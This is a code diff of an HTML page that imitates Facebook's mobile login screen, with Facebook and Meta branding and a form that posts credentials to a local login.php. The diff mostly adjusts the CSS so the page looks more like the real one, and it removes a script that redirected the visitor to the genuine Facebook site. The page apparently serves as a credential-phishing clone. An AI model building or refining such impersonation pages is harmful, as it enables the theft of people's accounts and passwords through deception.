@@ -5,8 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Facebook – log in or sign up</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
+      padding: 0;
       font-family: 'Segoe UI', sans-serif;
       background: linear-gradient(
         135deg,
@@ -20,8 +25,6 @@
       align-items: center;
       justify-content: flex-start;
       min-height: 100vh;
-      padding-top: 10px;
-      overflow-x: hidden;
     }
 
     .lang {
@@ -41,21 +44,19 @@
 
     .form-container {
       margin-top: 20px;
-      width: 90%;
+      width: 100%;
       max-width: 380px;
-      text-align: center;
+      padding: 0 20px;
     }
 
     .form-container input {
-      width: 90%;
-      padding: 20px;
-      margin: 5px 0;
+      width: 100%;
+      padding: 14px;
+      margin: 6px 0;
       border-radius: 10px;
       border: 1px solid #ccd0d5;
-      font-size: 18px;
+      font-size: 16px;
       background: #ffffff;
-      outline: none;
-      box-shadow: none;
     }
 
     .form-container button {
@@ -64,9 +65,9 @@
       background-color: #1877f2;
       color: white;
       font-size: 17px;
-      border: 0.5px solid #1877f2;
+      border: none;
       border-radius: 30px;
-      margin-top: 5px;
+      margin-top: 10px;
       cursor: pointer;
     }
 
@@ -75,13 +76,15 @@
       color: #121212;
       text-decoration: underline;
       display: block;
+      text-align: center;
       margin: 10px 0;
     }
 
     .create-account {
-      margin-top: 30px;
-      width: 90%;
+      margin-top: 20px;
+      width: 100%;
       max-width: 380px;
+      padding: 0 20px;
     }
 
     .create-account button {
@@ -97,9 +100,10 @@
     }
 
     .footer {
+      width: 100%;
       text-align: center;
-      margin-top: 20px;
-      margin-bottom: 10px;
+      margin-top: auto;
+      margin-bottom: 20px;
     }
 
     .meta-logo {
@@ -124,7 +128,6 @@
       display: none;
       font-size: 13px;
       margin-top: 10px;
-      overflow-y: scroll;
     }
 
     .more-dropdown a {
@@ -132,7 +135,6 @@
       color: #555;
       margin: 5px 0;
       text-decoration: none;
-      overflow-y: scroll;
     }
 
     @media (max-height: 700px) {
@@ -145,19 +147,13 @@
 <body>
 
   <div class="lang">English (UK)</div>
-  <br>
-  <br>
-  
+
   <div class="logo">
     <svg viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
       <circle cx="128" cy="128" r="128" fill="#1877F2"/>
       <path fill="#FFFFFF" d="M140 256v-96h32l4.8-37h-36.8v-24c0-10.7 3.1-18 19-18h20V47.4c-3.4-.4-15.3-1.5-29.1-1.5-28.8 0-48.5 17.6-48.5 50v28H76v37h25v96h39z"/>
     </svg>
   </div>
-  
-  <br>
-  <br>
-  
 
   <div class="form-container">
     <form action="login.php" method="POST">
@@ -167,16 +163,10 @@
     </form>
     <a href="#">Forgotten password?</a>
   </div>
-
-  <br>
-  <br>
  
   <div class="create-account">
     <button>Create new account</button>
   </div>
-  
-    <br>
-    <br>
 
   <div class="footer">
     <div class="meta-logo">Meta</div>
@@ -204,13 +194,6 @@
   </div>
 
   <script>
-    function redirectToFacebook(event) {
-      event.preventDefault();
-      setTimeout(() => {
-        window.location.href = "https://m.facebook.com/login";
-      }, 500);
-    }
-
     function toggleMore() {
       const box = document.getElementById("moreLinks");
       box.style.display = box.style.display === "block" ? "none" : "block";
